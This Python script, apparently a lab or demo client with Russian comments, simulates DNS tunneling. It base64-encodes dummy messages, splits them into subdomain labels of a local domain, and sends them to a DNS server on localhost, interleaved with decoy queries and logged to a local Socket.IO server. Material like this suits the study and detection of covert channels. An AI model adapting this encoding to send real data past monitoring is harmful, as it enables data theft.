import base64
import random
import string
import time
import socket
import dns.query
import dns.message
import socketio

# Подключение к Socket.IO серверу
sio = socketio.Client()

# Настройки
TARGET_DOMAIN = "myserver.local."
SERVER_URL = "http://localhost:5000"
QUERY_INTERVAL = 5  # секунд между "пакетами"
FRAGMENT_DELAY = 0.5  # секунд между фрагментами одного сообщения

# Генерация случайной строки
def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Кодирование и разбиение сообщения на DNS-запросы
def generate_suspicious_queries(message, session_id=None):
    encoded = base64.urlsafe_b64encode(message.encode()).decode().rstrip("=")
    chunks = [encoded[i:i+10] for i in range(0, len(encoded), 10)]
    total = len(chunks)
    session_id = session_id or generate_random_string(6)

    queries = []
    for i, chunk in enumerate(chunks):
        qname = f"{chunk}.{i}.{total}.{session_id}.{TARGET_DOMAIN}"
        queries.append(qname)
    return queries

# Генерация обычного DNS-запроса
def generate_normal_query():
    return generate_random_string(10) + "." + TARGET_DOMAIN

# Отправка DNS-запроса
def send_dns_query(query):
    q = dns.message.make_query(query, dns.rdatatype.A)
    response = dns.query.udp(q, '127.0.0.1', port=53535)
    return response

# События Socket.IO
@sio.event
def connect():
    print("Подключено к Socket.IO")

@sio.event
def disconnect():
    print("Отключено от Socket.IO")

# Основной цикл клиента
def run_client():
    try:
        sio.connect(SERVER_URL)
    except Exception as e:
        print(f"[!] Ошибка подключения к веб-серверу: {e}")

    while True:
        if random.choice([True, False]):
            # Подозрительный (скрытый) запрос
            message = random.choice([
                "Это скрытое сообщение!",
                "Пароль: qwerty123",
                "Передача данных через DNS",
                "Встречаемся в 7 у фонтана",
                "Секретный код: 42"
            ])
            queries = generate_suspicious_queries(message)
            for q in queries:
                print(f"[DNS] Отправка фрагмента: {q}")
                send_dns_query(q)
                time.sleep(FRAGMENT_DELAY)
            sio.emit("client_log", f"[CLIENT] Отправлено скрытое сообщение: {message}")
        else:
            # Обычный не подозрительный запрос
            domain = random.choice([
                "google",
                "yandex",
                "habr",
            ])
            print(f"[DNS] Отправка обычного запроса: {domain}")
            send_dns_query(domain)
            sio.emit("client_log", "[CLIENT] Отправлен обычный запрос")

        time.sleep(QUERY_INTERVAL)

if __name__ == "__main__":
    run_client()
